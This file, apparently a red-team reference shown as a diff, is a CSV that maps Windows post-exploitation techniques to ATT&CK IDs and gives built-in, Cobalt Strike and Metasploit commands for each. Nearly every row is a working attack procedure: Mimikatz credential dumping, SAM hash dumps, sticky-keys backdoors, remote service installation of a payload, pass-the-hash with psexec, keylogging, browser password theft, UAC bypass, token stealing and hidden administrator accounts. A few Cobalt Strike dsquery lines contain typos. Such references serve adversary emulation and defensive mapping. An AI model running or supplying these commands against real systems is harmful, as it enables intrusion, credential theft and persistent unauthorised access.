@@ -1,0 +1,237 @@
+Name,Framework,Description,Implementation,Techniques
+Dump credentials from LSASS,cobalt-strike,"This technique injects into the LSASS.exe process and scrapes its memory for plaintext passwords of logged on users. You must do this from a high integrity process. 
+The Mimikatz project has a lot of different capabilities (https://github.com/gentilkiwi/mimikatz/wiki) such as pass-the-hash, pass-the-ticket, creating silver/golden tickets, dumping credentials, and elevating a process.","logonpasswords
+mimikatz !sekurlsa::logonpasswords
+mimikatz !sekurlsa::msv
+mimikatz !sekurlsa::kerberos
+mimikatz !sekurlsa::wdigest",T1003
+Dump credentials from LSASS,metasploit,"This technique injects into the LSASS.exe process and scrapes its memory for plaintext passwords of logged on users. You must do this from a high integrity process. 
+The Mimikatz project has a lot of different capabilities (https://github.com/gentilkiwi/mimikatz/wiki) such as pass-the-hash, pass-the-ticket, creating silver/golden tickets, dumping credentials, and elevating a process.","use mimikatz
+wdigest
+msv
+kerberos
+logonpasswords",T1003
+Dumps hashes from the SAM Hive file,cobalt-strike,Dumps hashes from the SAM Hive file.,"hashdump
+mimikatz !lsadump::sam",T1003
+Dumps hashes from the SAM Hive file,metasploit,Dumps hashes from the SAM Hive file.,"hashdump
+run hashdump
+run smart_hashdump
+post/windows/gather/credentials/domain_hashdump",T1003
+Check terminal services,builtin,"Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled","reg query ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections",T1012
+Check terminal services,cobalt-strike,"Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled","shell reg query ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections",T1012
+Check terminal services,metasploit,"Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled","reg queryval -k ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" -v fDenyTSConnections
+post/windows/gather/enum_termserv",T1012
+Point sethc.exe file to cmd.exe,builtin,Modify the registry to point the sethc.exe file to point to cmd.exe,"Sticky Keys Persistence via Registry Manipulations:
+REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /v Debugger /t REG_SZ /d ""C:\windows\system32\cmd.exe"" /f",T1015
+Point sethc.exe file to cmd.exe,cobalt-strike,Modify the registry to point the sethc.exe file to point to cmd.exe,"Sticky Keys Persistence via Registry Manipulations:
+shell REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /v Debugger /t REG_SZ /d ""C:\windows\system32\cmd.exe"" /f",T1015
+Point sethc.exe file to cmd.exe,metasploit,Modify the registry to point the sethc.exe file to point to cmd.exe,post/windows/manage/sticky_keys,T1015
+Replace real sethc.exe with a copy of cmd.exe,builtin,Remove the real sethc.exe and replace it with a copy of cmd.exe. You can also just move the original sethc.exe to a different file if you don't want to delete it,"Sticky Keys Persistence via binary swapping:
+takeown.exe C:\Windows\system32\sethc.exe
+del C:\Windows\system32\sethc.exe
+copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe",T1015
+Replace real sethc.exe with a copy of cmd.exe,cobalt-strike,Remove the real sethc.exe and replace it with a copy of cmd.exe. You can also just move the original sethc.exe to a different file if you don't want to delete it,"Sticky Keys Persistence via binary swapping:
+shell takeown.exe C:\Windows\system32\sethc.exe
+shell del C:\Windows\system32\sethc.exe
+shell copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe",T1015
+Get network information,builtin,"Get information about the domain, network adapters, DNS / WSUS servers",ipconfig /all,T1016
+Get network information,cobalt-strike,"Get information about the domain, network adapters, DNS / WSUS servers",shell ipconfig,T1016
+Get network information,metasploit,"Get information about the domain, network adapters, DNS / WSUS servers","ipconfig
+post/windows/gather/enum_domains",T1016
+Get ARP table,builtin,Display the ARP table,"arp -a
+route print",T1016
+Get ARP table,cobalt-strike,Display the ARP table,shell arp -a,T1016
+Get ARP table,metasploit,Display the ARP table,route,T1016
+"Dump MAC, IP addresses and codes",builtin,Used to get the MAC and IP addresses as well as some descriptive codes for machines (0x1C indicates a domain controller),nbtstat -a {IP | COMP_NAME },T1016
+"Dump MAC, IP addresses and codes",cobalt-strike,Used to get the MAC and IP addresses as well as some descriptive codes for machines (0x1C indicates a domain controller),shell c:\windows\sysnative\nbstat.exe -a {IP | COMP_NAME},T1016
+Get the list of domain computers,builtin,Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$),"net group ""Domain Computers"" /domain[:DOMAIN]",T1018
+Get the list of domain computers,cobalt-strike,Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$),"net group ""Domain Computers"" /domain",T1018
+Get the list of domain computers,metasploit,Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$),"
+post/windows/gather/enum_ad_computers
+post/windows/gather/enum_computers",T1018
+Get the list of domain controllers,builtin,Display the list of domain controllers in the network,"net group ""Domain Controllers"" /domain[:DOMAIN]",T1018
+Get the list of domain controllers,cobalt-strike,Display the list of domain controllers in the network,"net group ""Domain Controllers"" /domain",T1018
+Display trust relationship with domain controller,builtin,Display the trust relationship between the workstation and the domain - must be elevated to use this!,nltest /dclist[:domain],T1018
+Display the login server,builtin,Display the active directory login server of the workstation,echo %LOGONSERVER%,T1018
+Display the login server,cobalt-strike,Display the active directory login server of the workstation,shell echo %LOGONSERVER%,T1018
+Get user information,builtin,"Get current user information, SID, domain, groups the user belongs to, security privs of the user",whoami /all /fo list,T1033
+Get user information,cobalt-strike,"Get current user information, SID, domain, groups the user belongs to, security privs of the user",shell whoami /all /fo list,T1033
+Get user information,metasploit,"Get current user information, SID, domain, groups the user belongs to, security privs of the user",getuid,T1033
+Check for common privilege escalation methods,builtin,"PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.","Check for common privilege escalation methods:
+*upload PowerUp.ps1 to victim disk*
+powershell.exe -epbypass PowerUp.ps1
+Invoke-AllChecks","T1058
+T1034
+T1044
+T1038"
+Check for common privilege escalation methods,cobalt-strike,"PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.","powershell-import /path/to/PowerUp.ps1
+powershell Invoke-AllChecks","T1058
+T1034
+T1044
+T1038"
+Check for common privilege escalation methods,metasploit,"PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.",exploit/windows/local/trusted_service_path,"T1058
+T1034
+T1044
+T1038"
+Create a new service remotely,builtin,"This technique creates a new service on the remote machine. It's important to note the spaces after the = in these commands! Also, before starting the service, run the following commands to make sure everything is set up properly:
+sc \\COMP qc acachsrv
+dir \\COMP\ADMIN$\acachsrv.exe","Creating a new service remotely:
+net use \\COMP\ADMIN$ ""password"" /user:DOMAIN_NAME\UserName
+copy evil.exe \\COMP\ADMIN$\System32\acachsrv.exe
+sc \\COMP create acachsrv binPath= ""C:\Windows\System32\acachsrv.exe"" start= auto  DisplayName= ""DisplayName""
+sc \\COMP start acachsrv","T1035
+T1077"
+Create a new service remotely,cobalt-strike,"This technique creates a new service on the remote machine. It's important to note the spaces after the = in these commands! Also, before starting the service, run the following commands to make sure everything is set up properly:
+sc \\COMP qc acachsrv
+dir \\COMP\ADMIN$\acachsrv.exe","Creating a new service remotely:
+shell net use \\COMP\ADMIN$ ""password"" /user:DOMAIN_NAME\UserName
+shell copy evil.exe \\COMP\ADMIN$\acachsrv.exe
+shell sc \\COMP create acachsrv binPath= ""C:\Windows\System32\acachsrv.exe"" start= auto description= ""Description here"" DisplayName= ""DisplayName""
+shell sc \\COMP start acachsrv","T1035
+T1077"
+Create a new service remotely (using psexec),builtin,"psexec copies over a file to the remote box via SMB, then creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, then deletes the service. Depending on the version of psexec, it might also migrate out of the initial process and delete the file that was copied over too. This is very similar to the previously mentioned technique of creating a service remotely, but the operator has much less control over the parameters","psexec is part of the SysInternals suite. It's not on systems by default, but it is likely to be a trusted executable, especially on sysadmin boxes where other SysInternals tools already exist:
+
+psexec /accepteula \\ip -u domain\user -p password -c -f \\smbip\share\file.exe (Copy and execute file.exe on the remote system)
+psexec /accepteula \\ip -u domain\user -p  lm:ntlm cmd.exe /c dir c:\Progra~1 (Run cmd.exe on the remote system using the lm:ntlm password hash - aka pass the hash)
+psexec /accepteula \\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)","T1035
+T1077"
+Create a new service remotely (using psexec),cobalt-strike,"psexec copies over a file to the remote box via SMB, then creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, then deletes the service. Depending on the version of psexec, it might also migrate out of the initial process and delete the file that was copied over too. This is very similar to the previously mentioned technique of creating a service remotely, but the operator has much less control over the parameters","psexec COMP_NAME {listener name} (via sc)
+psexec_sh COMP_NAME {listener name} (via powershell)","T1035
+T1077"
+Create a new service remotely (using psexec),metasploit,"psexec copies over a file to the remote box via SMB, then creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, then deletes the service. Depending on the version of psexec, it might also migrate out of the initial process and delete the file that was copied over too. This is very similar to the previously mentioned technique of creating a service remotely, but the operator has much less control over the parameters","PSEXEC Modules:
+exploit/windows/smb/psexec
+exploit/windows/local/current_user_psexec
+auxiliary/admin/smb/psexec_command
+auxiliary/scanner/smb/psexec_loggedin_users
+exploit/windows/smb/psexec_psh","T1035
+T1077"
+Get current TCP/IP connections,builtin,Display current TCP/IP network connections (b requires elevated privs so you can see the process that opened the connection),netstat -ano[b],T1049
+Get current TCP/IP connections,cobalt-strike,Display current TCP/IP network connections (b requires elevated privs so you can see the process that opened the connection),shell c:\windows\sysnative\netstat.exe -ano[b],T1049
+Get current TCP/IP connections,metasploit,Display current TCP/IP network connections (b requires elevated privs so you can see the process that opened the connection),post/windows/gather/tcpnetstat,T1049
+Display active SMB sessions,builtin,Display the list of active SMB sessions on the workstation so you can see which users have active connections.,"net session | find / ""\\""",T1049
+Display active SMB sessions,cobalt-strike,Display the list of active SMB sessions on the workstation so you can see which users have active connections.,"shell net session | find / ""\\""",T1049
+Display active SMB sessions,metasploit,Display the list of active SMB sessions on the workstation so you can see which users have active connections.,post/windows/gather/enum_logged_on_users,T1049
+Display all currently scheduled tasks,builtin,Displays all of the currently scheduled tasks to be run on a computer,schtasks [/s HOSTNAME],T1053
+Display all currently scheduled tasks,cobalt-strike,Displays all of the currently scheduled tasks to be run on a computer,shell schtasks,T1053
+Create a scheduled task,builtin,"Add scheduled task (/s is name/ip of remote system to do this on; /tn is the name of the task; /sc is when to run; /ru is user to runas; /rp is password for that user)
+may need to make sure that the schedule service is started and configured to run on boot so that your persistence sticks.
+Delete a scheduled task by name:
+schtasks [/s HOSTNAME] /delete /tn ""name""","Creating a scheduled task:
+schtasks [/S HOSTNAME] /create /tn ""acachesrv"" /tr C:\file\path\here.exe /sc ONLOGON /ru ""System"" [/rp password]
+Requirements for running scheduled tasks:
+net start schedule
+sc config schedule start= auto",T1053
+Create a scheduled task,cobalt-strike,"Add scheduled task (/s is name/ip of remote system to do this on; /tn is the name of the task; /sc is when to run; /ru is user to runas; /rp is password for that user)
+may need to make sure that the schedule service is started and configured to run on boot so that your persistence sticks.
+Delete a scheduled task by name:
+schtasks [/s HOSTNAME] /delete /tn ""name""","Creating a scheduled task:
+shell schtasks [/S HOSTNAME] /create /tn ""acachesrv"" /tr C:\file\path\here.exe /sc ONLOGON /ru ""System"" [/rp password]
+Requirements for running scheduled tasks:
+shell net start schedule
+shell sc config schedule start= auto",T1053
+Start a keylogger,metasploit,"Keylogging is extremely useful to get credentials and other information from the victim, but make sure that you are keylogging in a process belonging to the user you want to spy on. Keylogging within a SYSTEM process will not get you the keystrokes of other users on the system. For Cobalt Strike, make sure you specifiy the correct architecture and PID for a process running as the target victim. For Metasploit, make sure you've migrated to a process that is running as the target victim (explore.exe is always good).","starting the keylogger:
+keyscan_start
+when you're ready to get the logs:
+keyscan_dump
+when you're done keylogging:
+keyscan_stop",T1056
+Enumerate running processes,builtin,Display list of currently running processes and services on the system,"tasklist /v [/svc]
+net start
+qprocess *",T1057
+Enumerate running processes,cobalt-strike,Display list of currently running processes and services on the system,"ps
+shell tasklist /v [/svc]
+shell net start",T1057
+Enumerate running processes,metasploit,Display list of currently running processes and services on the system,"ps
+post/windows/gather/enum_services",T1057
+Elevate to SYSTEM level process,cobalt-strike,"This technique tries a series of exploits to elevate to a SYSTEM level process (these are actual exploits, not trust abuses, so there's always the potential for bluescreening)",getsystem,T1068
+Elevate to SYSTEM level process,metasploit,"This technique tries a series of exploits to elevate to a SYSTEM level process (these are actual exploits, not trust abuses, so there's always the potential for bluescreening)",getsystem,T1068
+Enumerate local Admin accounts,builtin,Display the list of local administrator accounts on the workstation,"net localgroup ""Administrators""",T1069
+Enumerate local Admin accounts,cobalt-strike,Display the list of local administrator accounts on the workstation,"shell net localgroup ""Administrators""",T1069
+Enumerate local Admin accounts,metasploit,Display the list of local administrator accounts on the workstation,post/windows/gather/local_admin_search_enum,T1069
+Get domain admin accounts,builtin,Display the list of domain administrator accounts,"net group [""Domain Admins""] /domain[:DOMAIN]",T1069
+Get domain admin accounts,cobalt-strike,Display the list of domain administrator accounts,"net group [""Domain Admins""] /domain",T1069
+Get domain admin accounts,metasploit,Display the list of domain administrator accounts,"domain_list_gen.rb
+post/windows/gather/enum_domain_group_users",T1069
+Enable RDP Services,builtin,Enable RDP via the registry and services,"Enable RDP Services:
+REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /t REG_DWORD /d 0 /f
+reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+net start TermService",T1076
+Enable RDP Services,cobalt-strike,Enable RDP via the registry and services,"Enable RDP Services:
+shell REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /t REG_DWORD /d 0 /f
+shell reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+shell net start TermService",T1076
+Enable RDP Services,metasploit,Enable RDP via the registry and services,post/windows/manage/enable_rdp,T1076
+Get available shares,builtin,"Used to view network shared resource information, add a new network resource, and remove an old network resource from the computer. Run this against computers discovered from the previous two commands to view the shares that are available on them.","net use [\\ip\path] [password] [/user:DOMAIN\user]
+net use \\COMP\ADMIN$ password /user:COMP\Administrator (checking password reuse on local admin account)",T1077
+Get available shares,cobalt-strike,"Used to view network shared resource information, add a new network resource, and remove an old network resource from the computer. Run this against computers discovered from the previous two commands to view the shares that are available on them.",shell net use [\\ip\path] [password] [/user:DOMAIN\user],T1077
+Collect passwords from web browsers,cobalt-strike,"https://github.com/AlessandroZ/LaZagne (now part of pupy as a post-exploit module)
+This program attempts to collect passwords from many different data sources related to browsers - it'll get passwords from Firefox, Chrome, Opera, IE.
+the -f command on the browsers command call is specifically targeting Firefox",shell laZagne.exe browsers [-f],T1081
+Collect passwords from web browsers,open source,"https://github.com/hassaanaliw/chromepass
+This program attempts to collect passwords that Chrome stores.","To print output simply: python chromepass.py -d
+To write to csv file: python chromepass.py --o csv
+To write to json file: python chromepass.py --o json",T1081
+Get Windows version,builtin,Get the Windows OS version that's running,ver,T1082
+Get Windows version,cobalt-strike,Get the Windows OS version that's running,shell ver,T1082
+Print environment variables,builtin,Print all of the environment variables,set,T1082
+Print environment variables,cobalt-strike,Print all of the environment variables,shell set,T1082
+Print environment variables,metasploit,Print all of the environment variables,get_env.rb,T1082
+Get computer information,builtin,"Get computer name, username, OS software version, domain information, DNS, logon domain","net config workstation
+net config server",T1082
+Get computer information,cobalt-strike,"Get computer name, username, OS software version, domain information, DNS, logon domain","shell net config workstation
+shell net config server",T1082
+Get configuration information,builtin,"Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties, such as RAM, disk space, and network cards",systeminfo [/s COMPNAME] [/u DOMAIN\user] [/p password],T1082
+Get configuration information,cobalt-strike,"Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties, such as RAM, disk space, and network cards","systemprofiler tool if no access yet (victim browses to website)
+or
+shell systeminfo (if you already have a beacon)",T1082
+Get configuration information,metasploit,"Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties, such as RAM, disk space, and network cards","sysinfo, run winenum, get_env.rb",T1082
+Gather more information on targeted users,builtin,"Used to add, delete, and manage the users on the computer. Run this command on the users discovered from the previous two commands to gather more information on targeted users.",net user [username] [/domain],T1087
+Gather more information on targeted users,cobalt-strike,"Used to add, delete, and manage the users on the computer. Run this command on the users discovered from the previous two commands to gather more information on targeted users.",shell net user [username] [/domain],T1087
+Gather more information on targeted users,metasploit,"Used to add, delete, and manage the users on the computer. Run this command on the users discovered from the previous two commands to gather more information on targeted users.","post/windows/gather/enum_ad_users
+auxiliary/scanner/smb/smb_enumusers",T1087
+"Query Active Directory for users, groups and permissions",builtin,"Dsquery is a Windows utility on servers that facilitates querying the Active Directory of the domain for lots of information about users, groups, and permissions. When constructing dsquery commands, if your domain is ""subdomain.domain.tld"", then your query will include ""dc=subdomain,dc=domain,dc=tld""","dsquery group ""ou=Domain Admins,dc=domain,dc=com""
+dsquery user ""dc=domain,dc=com""
+dsquery * OU=""Domain Admins"",DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description
+dsquery * -filter ""(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))"" -Attr samAccountName mail -Limit 0
+dsquery * -filter ""(&(objectCategory=group)(name=*Admin*))"" -Attr name description members",T1087
+"Query Active Directory for users, groups and permissions",cobalt-strike,"Dsquery is a Windows utility on servers that facilitates querying the Active Directory of the domain for lots of information about users, groups, and permissions. When constructing dsquery commands, if your domain is ""subdomain.domain.tld"", then your query will include ""dc=subdomain,dc=domain,dc=tld""","shell dsquery group ""out=Domain Admins"",dc=domain,dc=com""
+shell dsquery user ""dc=domain,dc=com""
+shell dsquery * OU=""Domain Admins"",dc=domain,dc=com -scope base -attr SAMAccountName userPrincipleName Description
+shell dsquery * -filter ""(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))"" -Attr samAccountName mail -Limit 0
+shell dsquery * -filter ""(&(objectCategory=group)(name=*Admin*))"" -Attr name description members",T1087
+Bypass UAC,cobalt-strike,"If you have a medium integrity process, but are an administrator, UACBypass will get you a high integrity process without prompting the user for confirmation.",uacbypass,T1088
+Bypass UAC,metasploit,"If you have a medium integrity process, but are an administrator, UACBypass will get you a high integrity process without prompting the user for confirmation.","One of the following:
+exploit/windows/local/bypassuac
+exploit/windows/local/bypassuac_injection
+exploit/windows/local/bypassuac_vbs",T1088
+Token stealing,cobalt-strike,"This steals the access token from another process and uses it to gain access to other services or computers. In Cobalt Strike, this token is only used when accessing remote systems, but in Meterpreter, this token is used for everything until it's dropped via rev2self. You need to be in a high integrity process for this to work.","Token Stealing:
+steal_token pid#",T1134
+Token stealing,metasploit,"This steals the access token from another process and uses it to gain access to other services or computers. In Cobalt Strike, this token is only used when accessing remote systems, but in Meterpreter, this token is used for everything until it's dropped via rev2self. You need to be in a high integrity process for this to work.","Token Stealing:
+use incognito
+list_tokens -u
+impersonate_token DOMAIN\\User
+or:
+steal_token {pid}",T1134
+Dump network shared resource information,builtin,"Used to view network shared resource information, share a new network resource, and remove an old shared network resource from the workstation. Not for remote queries",net share,T1135
+Dump network shared resource information,cobalt-strike,"Used to view network shared resource information, share a new network resource, and remove an old shared network resource from the workstation. Not for remote queries",net share,T1135
+Dump network shared resource information,metasploit,"Used to view network shared resource information, share a new network resource, and remove an old shared network resource from the workstation. Not for remote queries",auxiliary/scanner/smb/smb_enumshares,T1135
+List of workstations and network devices,builtin,Display the list of workstations and network devices on the network.,net view \\host /all [/domain:domain],T1135
+List of workstations and network devices,cobalt-strike,Display the list of workstations and network devices on the network.,net view \\host /domain,T1135
+List of workstations and network devices,metasploit,Display the list of workstations and network devices on the network.,auxiliary/scanner/smb/smb_enumshares,T1135
+Create backdoor user account,builtin,Create a backdoor user account that often appears on windows systems and add that user to the local administrators group and the remote desktop users group. This combined with the sticky keys persistence grants an inocuous system level persistence mechanism.,"Add backdoor user account:
+net user support_388945a0 somepasswordhere /add /y
+net localgroup administrators support_388945a0 /add
+net localgroup ""remote desktop users"" support_388945a0 /add",T1136
+Create backdoor user account,metasploit,Create a backdoor user account that often appears on windows systems and add that user to the local administrators group and the remote desktop users group. This combined with the sticky keys persistence grants an inocuous system level persistence mechanism.,post/windows/manage/add_user_domain,T1136
+Create backdoor user account,cobalt-strike,Create a backdoor user account that often appears on windows systems and add that user to the local administrators group and the remote desktop users group. This combined with the sticky keys persistence grants an inocuous system level persistence mechanism.,"Add backdoor user account:
+shell net user support_388945a0 somepasswordhere /add /y
+shell net localgroup administrators support_388945a0 /add
+shell net localgroup ""remote desktop users"" support_388945a0 /add",T1136
+"Enable ""support_388945a0"" account",builtin,"If the support_388945a0 account already exists on the system, but is disabled, you can enable it and then add it to the necessary groups.","Enable backdoor user account:
+net user support_388945a0 /active:yes
+net localgroup administrators support_388945a0 /add
+net localgroup ""remote desktop users"" support_388945a0 /add",T1136
+"Enable ""support_388945a0"" account",cobalt-strike,"If the support_388945a0 account already exists on the system, but is disabled, you can enable it and then add it to the necessary groups.","Enable backdoor user account:
+shell net user support_388945a0 /active:yes
+shell net localgroup administrators support_388945a0 /add
+shell net localgroup ""remote desktop users"" support_388945a0 /add",T1136
